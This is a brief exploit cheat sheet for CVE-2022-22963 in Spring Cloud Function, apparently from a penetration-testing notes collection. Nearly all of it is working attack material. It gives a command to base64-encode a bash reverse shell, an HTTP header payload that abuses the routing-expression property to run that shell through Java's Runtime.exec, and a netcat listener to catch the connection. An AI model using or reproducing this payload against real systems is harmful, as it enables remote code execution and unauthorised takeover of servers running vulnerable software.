# Spring Cloud Function

{% embed url="https://www.cvedetails.com/cve/CVE-2022-22963/" %}

```bash
echo -n "bash -i >& /dev/tcp/YOUR_IP/1337 0>&1" | base64
```

Payload HTTP Header

```java
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash
-c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS8xMzM3IDA+JjE=}|{base64,-d}|{bash,-
i}")
```

```bash
nc -nvlp 1337
```
